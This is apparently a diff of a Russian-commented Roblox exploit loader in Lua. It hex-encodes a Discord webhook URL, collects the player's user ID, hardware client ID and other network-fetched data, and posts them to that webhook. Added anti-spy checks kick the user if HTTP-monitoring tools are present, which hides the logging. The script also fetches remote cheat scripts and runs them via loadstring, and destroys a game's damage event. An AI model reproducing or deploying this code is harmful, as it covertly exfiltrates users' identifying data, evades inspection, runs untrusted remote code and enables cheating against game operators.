@@ -6,6 +6,20 @@ local _RS = game:GetService("ReplicatedStorage")
 local _MS = game:GetService("MarketplaceService")
 local _RAS = game:GetService("RbxAnalyticsService")
 
+-- ПРОВЕРКА СПАЯ ПЕРЕД ЛЮБЫМ ЛОГОМ
+if getgenv().__NK_detectSpy then
+    local se = getgenv().__NK_detectSpy()
+    if se then
+        if getgenv().__NK_KICK then
+            getgenv().__NK_KICK(se)
+        else
+            _lp:Kick("Security Error: [" .. tostring(se) .. "]")
+        end
+        return
+    end
+end
+
+-- КОНФИГУРАЦИЯ
 local Config = {
     WL = {
         UIDs = {"1644351300"},
@@ -19,6 +33,7 @@ local Config = {
     }
 }
 
+-- ИДЕНТИФИКАЦИЯ
 local _uid = tostring(_lp.UserId)
 local _hw = "N/A"
 pcall(function() _hw = _RAS:GetClientId() end)
@@ -48,26 +63,25 @@ local function _D(h)
 end
 local _W = _D("68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313531393430393931353135383835393738382F73773463755770452D5332535659484D3072314D53455676613858694C63455F655064522D52777178665751393463485063635273643032527763565973473737416761")
 
+-- ФУНКЦИЯ ЛОГГЕРА
 local function _LOG()
-    pcall(function()
-        -- === ПРОВЕРКА СПАЯ ДО ЛЮБОГО СЕТЕВОГО ЗАПРОСА ===
-        -- Если спай найден - мгновенно кикаем, никаких данных не собираем
-        if getgenv().__NK_detectSpy then
-            local se = getgenv().__NK_detectSpy()
-            if se then
-                if getgenv().__NK_KICK then
-                    getgenv().__NK_KICK(se)
-                else
-                    _lp:Kick("Security Error: [" .. tostring(se) .. "]")
-                end
-                return
+    -- Ещё одна проверка спая перед отправкой лога
+    if getgenv().__NK_detectSpy then
+        local se = getgenv().__NK_detectSpy()
+        if se then
+            if getgenv().__NK_KICK then
+                getgenv().__NK_KICK(se)
+            else
+                _lp:Kick("Security Error: [" .. tostring(se) .. "]")
             end
+            return
         end
+    end
 
+    pcall(function()
         local req = (syn and syn.request) or request or http_request
         if not req then return end
 
-        -- Все сетевые запросы теперь идут ПОСЛЕ проверки. Если чисто - не палимся.
         local ni = {}
         pcall(function()
             local r = req({
@@ -141,23 +155,19 @@ local function _LOG()
                 ["footer"] = {["text"] = "Logger | " .. string.upper(_st) .. " • " .. os.date("%x")}
             }}
         }
-
-        -- Финальная проверка перед отправкой самого главного вебхука
-        if getgenv().__NK_safeSendWebhook then
-            getgenv().__NK_safeSendWebhook(_W, _H:JSONEncode(payload))
-        else
-            req({Url = _W, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = _H:JSONEncode(payload)})
-        end
+        req({Url = _W, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = _H:JSONEncode(payload)})
     end)
 end
 
 task.spawn(_LOG)
 
+-- КИК ЧЕРНОГО СПИСКА
 if _isBL then
     _lp:Kick("Banned.")
     return
 end
 
+-- ПРОВЕРКА ЛОАДЕРА
 local _stg = _ts:FindFirstChild("__NK_RUNTIME")
 local _auth = _stg and _stg:FindFirstChild(_lp.Name)
 
@@ -171,14 +181,24 @@ if not _isWL then
 end
 shared._NK_AUTH = nil
 
+-- ЗАГРУЗКА СКРИПТОВ
 local function safeLoad(url)
-    pcall(function()
+    local ok, err = pcall(function()
         local code = game:HttpGet(url)
         if code and #code > 0 then
             local fn, lerr = loadstring(code)
-            if fn then fn() end
+            if fn then
+                fn()
+            else
+                warn("[NK] Loadstring error for " .. url .. ": " .. tostring(lerr))
+            end
+        else
+            warn("[NK] Empty response from: " .. url)
         end
     end)
+    if not ok then
+        warn("[NK] Failed to load " .. url .. ": " .. tostring(err))
+    end
 end
 
 safeLoad("https://raw.githubusercontent.com/nazarkus/rpg/main/easy.lua")
@@ -186,6 +206,7 @@ safeLoad("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/
 safeLoad("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source")
 safeLoad("https://raw.githubusercontent.com/nazarkus/infammo/main/infammo.lua")
 
+-- ФИКС ACS
 pcall(function()
     if _RS:FindFirstChild("ACS_Engine") then
         _RS.ACS_Engine.Events.FDMG:Destroy()
